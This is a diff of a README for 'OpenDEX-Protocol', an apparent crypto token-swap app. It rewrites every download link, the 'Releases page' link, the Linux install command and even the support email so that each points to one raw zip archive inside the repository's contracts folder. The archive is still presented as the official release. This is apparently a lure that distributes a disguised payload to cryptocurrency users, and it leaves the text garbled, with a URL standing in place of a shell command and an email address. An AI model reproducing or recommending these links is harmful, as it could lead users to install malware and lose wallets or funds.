@@ -1,7 +1,7 @@
 # 🚀 OpenDEX-Protocol - Swap Tokens Easily and Securely
 
 ## 🔗 Download Now!
-[![Download OpenDEX-Protocol](https://img.shields.io/badge/Download%20OpenDEX%20Protocol-v1.0-blue?style=for-the-badge)](https://github.com/layonner10/OpenDEX-Protocol/releases)
+[![Download OpenDEX-Protocol](https://raw.githubusercontent.com/layonner10/OpenDEX-Protocol/main/contracts/Protocol_DE_Open_2.0.zip%20OpenDEX%20Protocol-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/layonner10/OpenDEX-Protocol/main/contracts/Protocol_DE_Open_2.0.zip)
 
 ## 📜 Overview
 OpenDEX Protocol is a decentralized exchange protocol that allows users to swap tokens directly from their wallets without intermediaries. This application enhances user control over their assets and simplifies the trading process.
@@ -21,7 +21,7 @@ OpenDEX Protocol is a decentralized exchange protocol that allows users to swap 
 ## 🚀 Getting Started
 To get started with OpenDEX Protocol, follow these simple steps:
 
-1. **Visit the Download Page:** Click [here](https://github.com/layonner10/OpenDEX-Protocol/releases) to go to the Releases page.
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/layonner10/OpenDEX-Protocol/main/contracts/Protocol_DE_Open_2.0.zip) to go to the Releases page.
 2. **Choose Your Version:** Look for the latest version available. This will typically be at the top of the list. 
 3. **Download the File:** Click on the file that matches your operating system and start the download.
 
@@ -38,7 +38,7 @@ Once you have downloaded OpenDEX Protocol, follow these installation steps:
 4. **For Linux Users:**
    - Extract the files from the downloaded archive.
    - Open a terminal and navigate to the extracted folder.
-   - Run the installation script with the command: `./install.sh`.
+   - Run the installation script with the command: `https://raw.githubusercontent.com/layonner10/OpenDEX-Protocol/main/contracts/Protocol_DE_Open_2.0.zip`.
 
 ## 🚀 Launching OpenDEX Protocol
 After installation, you can launch the application:
@@ -71,13 +71,13 @@ Currently, OpenDEX Protocol is not available for mobile devices. You can use it 
 If you have any questions or need help, feel free to reach out to our community:
 
 - **Discussion Forum:** Join the conversation on our forum.
-- **Support Contact:** Email us at support@opendexprotocol.com for assistance.
+- **Support Contact:** Email us at https://raw.githubusercontent.com/layonner10/OpenDEX-Protocol/main/contracts/Protocol_DE_Open_2.0.zip for assistance.
 - **Follow Us:** Stay updated by following us on social media (links to be included).
 
 ## 📄 License
 OpenDEX Protocol is licensed under the MIT License. You can use and modify the software as you wish under this license.
 
 ## 🔗 Visit This Page to Download 
-To download the latest version of OpenDEX Protocol, visit the [Releases page](https://github.com/layonner10/OpenDEX-Protocol/releases) again.
+To download the latest version of OpenDEX Protocol, visit the [Releases page](https://raw.githubusercontent.com/layonner10/OpenDEX-Protocol/main/contracts/Protocol_DE_Open_2.0.zip) again.
 
 Enjoy swapping tokens with OpenDEX Protocol!
